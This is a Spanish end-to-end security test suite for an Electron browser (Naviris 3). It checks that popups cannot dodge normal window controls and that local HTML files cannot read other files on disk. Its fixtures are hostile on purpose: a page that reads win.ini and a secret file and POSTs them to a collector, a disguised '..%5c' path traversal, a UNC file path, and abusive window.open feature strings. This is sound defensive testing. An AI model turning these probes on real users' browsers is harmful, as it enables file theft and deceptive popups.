// Parte «seguridad» de Naviris 3, en la app de verdad:
// · lo que una web consigue con el tercer argumento de window.open (nada: solo tamaño y sitio);
// · lo que una página file:// puede leer del disco (nada fuera de lo que muestra).
// Todos los archivos son de la prueba, salvo C:/Windows/win.ini, que no es de nadie.
// Con el inspector del proceso principal se miran las ventanas tal como quedaron.
// NAVIRIS_E2E_PUERTO=9417 npm run test:e2e   (o: node --test test/e2e/seguridad.e2e.js)
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const zlib = require('node:zlib');
const { arranca, conecta, lista, hasta, espera, PUERTO } = require('./naviris');

const PUERTO_MAIN = PUERTO + 100;

// Servidor local: las páginas de la prueba y lo que una página intente mandar fuera.
const recibido = [];
const PADRE = '<!doctype html><meta charset="utf-8"><title>padre</title><button style="position:fixed;inset:0;width:100%;height:100%">abrir</button>';
const HIJA = '<!doctype html><meta charset="utf-8"><title>hija</title><script>window.__opener = !!window.opener; if (window.opener) opener.postMessage("hola desde la hija", "*");</script><button style="position:fixed;inset:0;width:100%;height:100%">otra</button>';
const ENLACE = '<!doctype html><meta charset="utf-8"><title>enlace</title><a id="a" href="/destino" style="position:fixed;left:40px;top:40px">un enlace</a>';
const servidor = http.createServer((req, res) => {
  let cuerpo = '';
  req.on('data', (c) => { cuerpo += c; });
  req.on('end', () => {
    if (req.method === 'POST') { recibido.push(cuerpo); res.writeHead(200, { 'access-control-allow-origin': '*' }); res.end('ok'); return; }
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(req.url.startsWith('/hija') ? HIJA : req.url.startsWith('/enlace') ? ENLACE : PADRE);
  });
});
let base;

// PNG de 2x2 rojo, hecho a mano.
function png() {
  const tabla = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0; });
  const crc = (b) => { let c = 0xffffffff; for (const x of b) c = tabla[(c ^ x) & 255] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
  const trozo = (t, d) => { const l = Buffer.alloc(4); l.writeUInt32BE(d.length); const td = Buffer.concat([Buffer.from(t), d]); const c = Buffer.alloc(4); c.writeUInt32BE(crc(td)); return Buffer.concat([l, td, c]); };
  const ih = Buffer.alloc(13); ih.writeUInt32BE(2, 0); ih.writeUInt32BE(2, 4); ih[8] = 8; ih[9] = 2;
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), trozo('IHDR', ih), trozo('IDAT', zlib.deflateSync(Buffer.from([0, 255, 0, 0, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0]))), trozo('IEND', Buffer.alloc(0))]);
}
// WAV de 0,1 s en silencio.
function wav() {
  const n = 800, c = Buffer.alloc(44 + n);
  c.write('RIFF', 0); c.writeUInt32LE(36 + n, 4); c.write('WAVEfmt ', 8); c.writeUInt32LE(16, 16); c.writeUInt16LE(1, 20); c.writeUInt16LE(1, 22);
  c.writeUInt32LE(8000, 24); c.writeUInt32LE(8000, 28); c.writeUInt16LE(1, 32); c.writeUInt16LE(8, 34); c.write('data', 36); c.writeUInt32LE(n, 40); c.fill(128, 44);
  return c;
}
// PDF de una página con texto, que PDFium pinta aunque no lleve tabla de referencias.
const PDF = '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 200]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj\n4 0 obj<</Length 44>>stream\nBT /F1 24 Tf 20 100 Td (PDF de prueba) Tj ET\nendstream endobj\n5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n';

const DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'naviris-e2e-seguridad-'));
const url = (...partes) => 'file:///' + path.join(DIR, ...partes).replace(/\\/g, '/');
const SECRETO = 'SECRETO-DE-LA-PRUEBA', LEJOS = 'SECRETO-DE-OTRA-CARPETA';
function montaArchivos() {
  const escribe = (ruta, datos) => { const f = path.join(DIR, ruta); fs.mkdirSync(path.dirname(f), { recursive: true }); fs.writeFileSync(f, datos); };
  escribe('descargas/secreto.txt', SECRETO);
  escribe('descargas/imagen.png', png());
  escribe('descargas/con espacios/cerca.png', png());
  escribe('descargas/estilo.css', 'body { --marca: 1 }');
  escribe('descargas/guion.js', 'window.__guion = 1;');
  escribe('descargas/sw.js', 'self.addEventListener("fetch", () => {});');
  escribe('descargas/tono.wav', wav());
  escribe('descargas/marco.html', '<!doctype html><title>marco</title><p id="p">TEXTO-DEL-MARCO</p>');
  escribe('descargas/dibujo.svg', '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>');
  escribe('descargas/doc.pdf', PDF);
  escribe('otra-carpeta/lejos.txt', LEJOS);
  escribe('otra-carpeta/lejos.png', png());
  escribe('descargas/factura.html', `<!doctype html><meta charset="utf-8"><title>Factura</title>
<link rel="stylesheet" href="estilo.css"><script src="guion.js"></script>
<h1>Factura</h1>
<img id="propia" src="imagen.png"><img id="cerca" src="con%20espacios/cerca.png"><img id="lejos" src="../otra-carpeta/lejos.png"><img id="disfrazada" src="..%5cotra-carpeta%5clejos.png">
<audio id="audio" src="tono.wav" preload="auto"></audio>
<iframe id="marco" src="marco.html"></iframe>
<script>
  const pidePorFetch = (u) => fetch(u).then((r) => r.text());
  const pidePorXhr = (u) => new Promise((ok, mal) => { const x = new XMLHttpRequest(); x.open('GET', u); x.onload = () => ok(x.responseText); x.onerror = () => mal(new Error('xhr')); x.send(); });
  window.__fetch = pidePorFetch; window.__xhr = pidePorXhr;
  window.__robo = (async () => {
    const r = {};
    for (const [n, f] of [['fetch', pidePorFetch], ['xhr', pidePorXhr]]) {
      for (const [q, u] of [['win', 'file:///C:/Windows/win.ini'], ['secreto', ${JSON.stringify(url('descargas/secreto.txt'))}], ['relativo', 'secreto.txt']]) {
        try { r[n + '-' + q] = (await f(u)).slice(0, 60); } catch { r[n + '-' + q] = null; }
      }
    }
    await fetch(${JSON.stringify('BASE/recoge')}.replace('BASE', location.hash.slice(1)), { method: 'POST', mode: 'no-cors', body: JSON.stringify(r) });
    return r;
  })();
</script>`);
}

// La app con el inspector del proceso principal
let app, principal;
const enMain = async (expr) => {
  const r = await principal.envia('Runtime.evaluate', { expression: `(async () => { const { BrowserWindow, screen } = require('electron'); ${expr} })()`, awaitPromise: true, returnByValue: true, includeCommandLineAPI: true });
  if (r.exceptionDetails) throw new Error(r.exceptionDetails.exception?.description || r.exceptionDetails.text);
  return r.result.value;
};
const ES_EMERGENTE = `w.webContents.getType() === 'window' && !/index\\.html|splash/.test(w.webContents.getURL())`;
const ventanas = () => enMain(`return BrowserWindow.getAllWindows().filter((w) => ${ES_EMERGENTE}).map((w) => ({
  url: w.webContents.getURL(), bounds: w.getBounds(), contenido: w.getContentBounds(), encima: w.isAlwaysOnTop(), cerrable: w.isClosable(), minimizable: w.isMinimizable(),
  maximizable: w.isMaximizable(), movible: w.isMovable(), redimensionable: w.isResizable(), enfocable: w.isFocusable(), opacidad: w.getOpacity(), visible: w.isVisible(),
  completa: w.isFullScreen(), kiosko: w.isKiosk(), minimo: w.getMinimumSize(),
  pantalla: screen.getDisplayMatching(w.getBounds()).workArea }));`);
const cierraVentanas = async () => {
  await enMain(`BrowserWindow.getAllWindows().filter((w) => ${ES_EMERGENTE}).forEach((w) => w.destroy()); return 1;`);
  await espera(150);
};
const hija = async () => (await lista()).find((x) => /\/hija/.test(x.url) && x.type !== 'webview');

test.before(async () => {
  await new Promise((r) => servidor.listen(0, '127.0.0.1', r));
  base = `http://127.0.0.1:${servidor.address().port}`;
  montaArchivos();
  app = await arranca([`--inspect=${PUERTO_MAIN}`]);
  const dbg = (await (await fetch(`http://127.0.0.1:${PUERTO_MAIN}/json/list`)).json())[0];
  principal = await conecta(dbg.webSocketDebuggerUrl);
  await principal.envia('Runtime.enable');
});
test.after(async () => {
  principal?.cierra();
  await app?.cierra();
  servidor.closeAllConnections(); servidor.close();
  fs.rmSync(DIR, { recursive: true, force: true, maxRetries: 5, retryDelay: 300 });
});
test.afterEach(async () => { await cierraVentanas().catch(() => {}); });

// Abre con un clic de verdad en la página, como haría una estafa
async function abreConClic(web, rasgos, nombre = 'x') {
  await web.clic(100, 100);
  await web.evalua(`window.__w = window.open(${JSON.stringify(base + '/hija')}, ${JSON.stringify(nombre)}, ${JSON.stringify(rasgos)}); 1`);
  return (await hasta(async () => { const v = await ventanas(); return v.length && v; }, 8000))[0];
}
const paginaWeb = async (ruta = '/') => {
  const antes = new Set((await lista()).map((x) => x.id));
  await app.ui.evalua(`void createTab(${JSON.stringify(base + ruta)})`);
  const w = await hasta(async () => (await lista()).find((x) => x.type === 'webview' && !antes.has(x.id) && x.url.startsWith(base)));
  const web = await conecta(w.webSocketDebuggerUrl);
  await hasta(() => web.evalua('document.readyState === "complete"'));
  return web;
};
function ventanaNormal(v) {
  assert.equal(v.encima, false, 'siempre encima');
  assert.equal(v.cerrable, true, 'se puede cerrar');
  assert.equal(v.minimizable, true);
  assert.equal(v.maximizable, true);
  assert.equal(v.movible, true);
  assert.equal(v.redimensionable, true);
  assert.equal(v.enfocable, true);
  assert.equal(v.opacidad, 1, 'opacidad');
  assert.equal(v.visible, true, 'visible');
  assert.equal(v.completa, false);
  assert.equal(v.kiosko, false);
  assert.deepEqual(v.minimo, [0, 0], 'sin tamaño mínimo impuesto');
  assert.ok(v.contenido.height < v.bounds.height, 'con barra de título');
  const p = v.pantalla, b = v.bounds;
  assert.ok(b.x >= p.x && b.y >= p.y && b.x + b.width <= p.x + p.width && b.y + b.height <= p.y + p.height, `dentro de la pantalla: ${JSON.stringify(b)} en ${JSON.stringify(p)}`);
}

// Pequeñas y en una esquina, para no tapar la pantalla de quien lo ejecute.
const HOSTILES = {
  'sin marco, encima y sin cerrar': 'popup,frame=no,thickFrame=no,titleBarStyle=hidden,alwaysOnTop=yes,closable=no,minimizable=no,maximizable=no,movable=no,skipTaskbar=yes,focusable=no,left=20,top=20,width=320,height=200',
  'invisible': 'popup,opacity=0,left=20,top=20,width=320,height=200',
  'oculta y transparente': 'popup,show=no,transparent=yes,width=320,height=200',
  'kiosco y pantalla completa': 'popup,fullscreen=yes,kiosk=yes,width=320,height=200',
  'mínimo mayor que la pantalla': 'popup,minWidth=9000,minHeight=9000,width=320,height=200',
  'máximo diminuto': 'popup,maxWidth=1,maxHeight=1,width=320,height=200',
  'fuera de la pantalla y enorme': 'popup,left=-20000,top=-20000,width=4000,height=3000,enableLargerThanScreen=yes',
  'lejos por el otro lado': 'popup,x=90000,y=90000,width=320,height=200'
};

test('una web no controla la ventana con el tercer argumento de window.open', async () => {
  const web = await paginaWeb();
  for (const [caso, rasgos] of Object.entries(HOSTILES)) {
    const v = await abreConClic(web, rasgos, 'hostil');
    try { ventanaNormal(v); } catch (e) { e.message = caso + ': ' + e.message; throw e; }
    if (caso === 'máximo diminuto') assert.ok(v.bounds.width >= 320 && v.bounds.height >= 200, 'sin tope de tamaño');
    await cierraVentanas();
  }
  web.cierra();
});

test('la ventanita de un inicio de sesión: tamaño pedido, sitio pedido y window.opener', async () => {
  const web = await paginaWeb();
  await web.evalua(`window.__msg = []; addEventListener('message', (e) => __msg.push(e.data)); 1`);
  const zona = await enMain('return screen.getPrimaryDisplay().workArea;');
  // Como la abre Google: tamaño y sitio, en la pantalla principal.
  const v = await abreConClic(web, `width=500,height=600,left=${zona.x + 100},top=${zona.y + 50},scrollbars=yes,resizable=yes`);
  ventanaNormal(v);
  assert.deepEqual(v.bounds, { x: zona.x + 100, y: zona.y + 50, width: 500, height: 600 });
  await hasta(() => web.evalua(`__msg.includes('hola desde la hija')`), 8000);
  const t = await hasta(hija);
  const c = await conecta(t.webSocketDebuggerUrl);
  assert.equal(await c.evalua('window.__opener'), true);
  await web.evalua(`__w.postMessage('hola desde el padre', '*'); 1`);
  await c.evalua(`window.__oido = new Promise((ok) => addEventListener('message', (e) => ok(e.data))); 1`);
  await web.evalua(`__w.postMessage('hola desde el padre', '*'); 1`);
  assert.equal(await c.evalua('window.__oido'), 'hola desde el padre');
  // Cerrar la cierra (closable de verdad) y el padre lo ve.
  await enMain(`BrowserWindow.getAllWindows().filter((w) => ${ES_EMERGENTE}).forEach((w) => w.close()); return 1;`);
  await hasta(() => web.evalua('__w.closed'), 5000);
  c.cierra(); web.cierra();
});

test('window.open vacío que la página llena después (también lo usan los logins)', async () => {
  const web = await paginaWeb();
  await web.clic(100, 100);
  await web.evalua(`window.__w = window.open('about:blank', 'vacia', 'popup,frame=no,width=320,height=200'); __w.document.title = 'llena'; 1`);
  const v = (await hasta(async () => { const l = await ventanas(); return l.length && l; }, 8000))[0];
  ventanaNormal(v);
  assert.equal(await web.evalua('__w.document.title'), 'llena');
  await web.evalua(`__w.location = ${JSON.stringify(base + '/hija')}; 1`);
  await hasta(hija, 8000);
  web.cierra();
});

test('la ventana que abre una ventana sigue las mismas reglas', async () => {
  const web = await paginaWeb();
  await abreConClic(web, 'popup,left=20,top=20,width=320,height=240', 'madre');
  const t = await hasta(hija);
  const c = await conecta(t.webSocketDebuggerUrl);
  await hasta(() => c.evalua('document.readyState === "complete"'));
  await c.clic(50, 50);
  await c.evalua(`window.open(${JSON.stringify(base + '/hija?2')}, 'nieta', 'popup,frame=no,alwaysOnTop=yes,closable=no,opacity=0,left=60,top=60,width=320,height=200'); 1`);
  const nieta = await hasta(async () => (await ventanas()).find((v) => /hija\?2/.test(v.url)), 8000);
  ventanaNormal(nieta);
  c.cierra(); web.cierra();
});

test('la pantalla completa de la página se queda dentro de la ventana y Esc sale', async () => {
  const web = await paginaWeb();
  await abreConClic(web, 'popup,left=20,top=20,width=320,height=240', 'completa');
  const t = await hasta(hija);
  const c = await conecta(t.webSocketDebuggerUrl);
  await hasta(() => c.evalua('document.readyState === "complete"'));
  await c.clic(50, 50);
  await c.evalua('document.documentElement.requestFullscreen().then(() => 1)');
  await espera(600);
  const v = (await ventanas())[0];
  ventanaNormal(v);
  assert.deepEqual([v.bounds.width, v.bounds.height], [320, 240]);
  assert.equal(await c.evalua('!!document.fullscreenElement'), true);
  for (const type of ['rawKeyDown', 'keyUp']) await c.envia('Input.dispatchKeyEvent', { type, key: 'Escape', code: 'Escape', windowsVirtualKeyCode: 27, nativeVirtualKeyCode: 27 });
  await hasta(() => c.evalua('!document.fullscreenElement'), 4000);
  c.cierra(); web.cierra();
});

test('«Abrir el enlace en una ventana nueva» sale con el contenedor de la pestaña', async () => {
  const c = await app.ui.evalua('nuevoContenedor().id');
  await espera(300);   // lo guarda en los ajustes del proceso principal
  const antes = new Set((await lista()).map((x) => x.id));
  await app.ui.evalua(`void createTab(${JSON.stringify(base + '/enlace')}, true, contenedores.find((x) => x.id === ${JSON.stringify(c)}))`);
  const w = await hasta(async () => (await lista()).find((x) => x.type === 'webview' && !antes.has(x.id) && /enlace/.test(x.url)));
  const web = await conecta(w.webSocketDebuggerUrl);
  await hasta(() => web.evalua('document.readyState === "complete"'));
  const [x, y] = await web.evalua(`(() => { const r = document.getElementById('a').getBoundingClientRect(); return [r.x + r.width / 2, r.y + r.height / 2]; })()`);
  await web.envia('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y });
  await web.envia('Input.dispatchMouseEvent', { type: 'mousePressed', x, y, button: 'right', buttons: 2, clickCount: 1 });
  await web.envia('Input.dispatchMouseEvent', { type: 'mouseReleased', x, y, button: 'right', buttons: 0, clickCount: 1 });
  await hasta(() => app.ui.evalua('!!document.querySelector(".ctx-menu.abierto") && !!ctxMenuEl'), 5000);
  await espera(250);
  const p = await app.ui.evalua(`(() => { const b = [...ctxMenuEl.querySelectorAll('.ctx-item')].find((i) => i.querySelector('.ctx-tx').textContent === 'Abrir el enlace en una ventana nueva'); const r = b.getBoundingClientRect(); return [r.x + r.width / 2, r.y + r.height / 2]; })()`);
  const ids = new Set((await lista()).map((x) => x.id));
  await app.ui.clic(p[0], p[1]);
  const nueva = await hasta(async () => (await lista()).find((t) => t.type === 'page' && /index\.html\?sacada=1/.test(t.url) && !ids.has(t.id)));
  const ui2 = await conecta(nueva.webSocketDebuggerUrl);
  try {
    await hasta(() => ui2.evalua(`typeof tabs !== 'undefined' && tabs.some((t) => /destino/.test(t.url || ''))`));
    assert.equal(await ui2.evalua(`tabs.find((t) => /destino/.test(t.url || '')).contenedor?.id ?? null`), c);
  } finally {
    ui2.cierra();
    await fetch(`http://127.0.0.1:${PUERTO}/json/close/${nueva.id}`).catch(() => {});
  }
  web.cierra();
});

test('«Permitir en este sitio» abre lo bloqueado con las mismas reglas', async () => {
  const web = await paginaWeb();
  const wc = await app.ui.evalua('tabs.find((t) => t.id === activeId).webview.getWebContentsId()');
  // Sin clic: se bloquea. Se quema el gesto que pudiera quedar.
  await espera(5200);
  assert.equal(await web.evalua(`window.open(${JSON.stringify(base + '/hija')}, 'bloqueada', 'popup,frame=no,alwaysOnTop=yes,closable=no,opacity=0,show=no,left=20,top=20,width=320,height=200')`), null);
  await espera(300);
  assert.equal((await ventanas()).length, 0, 'bloqueada');
  await app.ui.evalua(`window.navirisApp.permitirEmergentes(${JSON.stringify(base)}, ${wc}), 1`);
  const v = (await hasta(async () => { const l = await ventanas(); return l.length && l; }, 8000))[0];
  ventanaNormal(v);
  assert.deepEqual([v.bounds.x, v.bounds.y, v.bounds.width, v.bounds.height].slice(2), [320, 200]);
  web.cierra();
});

// ---------- Páginas locales ----------
const LOCAL = url('descargas/factura.html');
async function abreLocal(direccion) {
  const antes = new Set((await lista()).map((x) => x.id));
  // Lo que hace el panel de descargas (openDownloadInBrowser)
  await app.ui.evalua(`void createTab(${JSON.stringify(direccion)})`);
  const w = await hasta(async () => (await lista()).find((x) => x.type === 'webview' && !antes.has(x.id) && x.url.startsWith('file:')));
  const c = await conecta(w.webSocketDebuggerUrl);
  await hasta(() => c.evalua('document.readyState === "complete"'));
  return c;
}
let local;

test('un .html local no lee el disco ni con fetch ni con XHR, y no sale nada a un servidor', async () => {
  local = await abreLocal(`${LOCAL}#${base}`);
  const r = await local.evalua('window.__robo');
  for (const n of ['fetch-win', 'xhr-win', 'fetch-secreto', 'xhr-secreto', 'fetch-relativo', 'xhr-relativo']) assert.equal(r[n], null, n);
  await hasta(() => recibido.length === 1);
  assert.doesNotMatch(recibido[0], /16-bit|fonts|SECRETO/);
});

test('un .html local no lee otros archivos con un iframe, <object> ni window.open', async () => {
  assert.equal(await local.evalua(`document.getElementById('marco').contentDocument?.getElementById('p')?.textContent ?? null`), null, 'iframe de su carpeta');
  const texto = await local.evalua(`(async () => {
    const out = [];
    for (const [etiqueta, attr] of [['iframe', 'src'], ['object', 'data'], ['embed', 'src']]) {
      const m = document.createElement(etiqueta); m[attr] = ${JSON.stringify(url('otra-carpeta/lejos.txt'))}; document.body.append(m);
      await new Promise((ok) => { m.onload = ok; m.onerror = ok; setTimeout(ok, 800); });
      try { out.push(m.contentDocument?.body?.textContent || ''); } catch { out.push(''); }
    }
    return out.join('|');
  })()`);
  assert.doesNotMatch(texto, /SECRETO/);
  await local.clic(10, 10);
  const nula = await local.evalua(`(() => { const w = window.open(${JSON.stringify(url('otra-carpeta/lejos.txt'))}, 'lee', 'popup,width=300,height=200'); return w === null; })()`);
  assert.equal(nula, true, 'window.open a un archivo no abre nada');
});

test('una ventanita vacía no sirve para llegar a un archivo y leerlo', async () => {
  await local.clic(10, 10);
  const texto = await local.evalua(`(async () => {
    const w = window.open('about:blank', 'puente', 'popup,left=20,top=20,width=320,height=200');
    if (!w) return 'sin ventana';
    w.location = ${JSON.stringify(url('otra-carpeta/lejos.txt'))};
    await new Promise((ok) => setTimeout(ok, 1200));
    try { return w.document.body.textContent; } catch (e) { return 'sin acceso'; }
  })()`);
  assert.doesNotMatch(texto, /SECRETO/);
});

test('sus imágenes, sonidos, estilos y scripts siguen cargando; las de otra carpeta no', async () => {
  const anchos = await local.evalua(`(async () => {
    const out = {};
    for (const i of document.images) { if (!i.complete) await new Promise((ok) => { i.onload = ok; i.onerror = ok; }); out[i.id] = i.naturalWidth; }
    return out;
  })()`);
  assert.deepEqual(anchos, { propia: 2, cerca: 2, lejos: 0, disfrazada: 0 });
  assert.equal(await local.evalua('window.__guion'), 1, 'script de su carpeta');
  assert.equal(await local.evalua('document.styleSheets.length'), 1, 'estilo de su carpeta');
  await hasta(() => local.evalua(`document.getElementById('audio').duration > 0`), 5000);
});

test('history.pushState no le da permiso sobre otra carpeta', async () => {
  const ancho = await local.evalua(`(async () => {
    try { history.pushState({}, '', ${JSON.stringify(url('otra-carpeta/falsa.html'))}); } catch { return 'pushState rechazado'; }
    const i = new Image(); i.src = ${JSON.stringify(url('otra-carpeta/lejos.png'))};
    await new Promise((ok) => { i.onload = ok; i.onerror = ok; });
    return i.naturalWidth;
  })()`);
  assert.ok(ancho === 0 || ancho === 'pushState rechazado', 'cargó: ' + ancho);
});

test('una página local no instala un service worker ni llega a otro equipo', async () => {
  const sw = await local.evalua(`navigator.serviceWorker.register('sw.js').then((r) => 'registrado ' + r.scope, (e) => 'no: ' + e.message)`);
  assert.match(sw, /^no: /);
  const ancho = await local.evalua(`(async () => {
    const i = new Image(); i.src = 'file://127.0.0.1/c$/naviris-prueba-no-existe.png';
    await new Promise((ok) => { i.onload = ok; i.onerror = ok; setTimeout(ok, 3000); });
    return i.naturalWidth;
  })()`);
  assert.equal(ancho, 0);
  local.cierra();
});

test('abrir y ver archivos locales sigue funcionando: imagen, svg, texto, audio y pdf', async () => {
  const mira = async (archivo, expr) => { const c = await abreLocal(url('descargas', archivo)); const v = await hasta(() => c.evalua(expr), 8000); c.cierra(); return v; };
  assert.equal(await mira('imagen.png', 'document.images[0]?.naturalWidth'), 2);
  assert.equal(await mira('dibujo.svg', `document.documentElement.tagName === 'svg' && document.contentType`), 'image/svg+xml');
  assert.equal(await mira('secreto.txt', 'document.body.textContent'), SECRETO);
  assert.equal(await mira('tono.wav', `document.querySelector('video,audio')?.duration > 0`), true);
  // El PDF: su visor pinta algo que no es solo fondo. Se mira con una captura.
  const c = await abreLocal(url('descargas/doc.pdf'));
  assert.equal(await c.evalua('document.contentType'), 'application/pdf');
  await espera(2500);
  const pantallazo = await hasta(async () => (await lista()).find((x) => x.type === 'webview' && /doc\.pdf/.test(x.url)));
  const s = await conecta(pantallazo.webSocketDebuggerUrl);
  const { data } = await s.envia('Page.captureScreenshot', { format: 'png' });
  if (process.env.NAVIRIS_E2E_DIR) fs.writeFileSync(path.join(process.env.NAVIRIS_E2E_DIR, 'pdf-local.png'), Buffer.from(data, 'base64'));
  assert.ok(Buffer.from(data, 'base64').length > 3000, 'el visor pintó algo');
  s.cierra(); c.cierra();
});

test('la interfaz no se entera: sigue con su localStorage y sus imágenes locales', async () => {
  assert.equal(await app.ui.evalua(`localStorage.setItem('naviris.__seguridad', '1'), localStorage.getItem('naviris.__seguridad')`), '1');
  await app.ui.evalua(`localStorage.removeItem('naviris.__seguridad'), 1`);
  const ancho = await app.ui.evalua(`(async () => {
    const i = new Image(); i.src = ${JSON.stringify(url('otra-carpeta/lejos.png'))};
    await new Promise((ok) => { i.onload = ok; i.onerror = ok; });
    return i.naturalWidth;
  })()`);
  assert.equal(ancho, 2, 'el fondo del hub es un file: de cualquier carpeta');
});
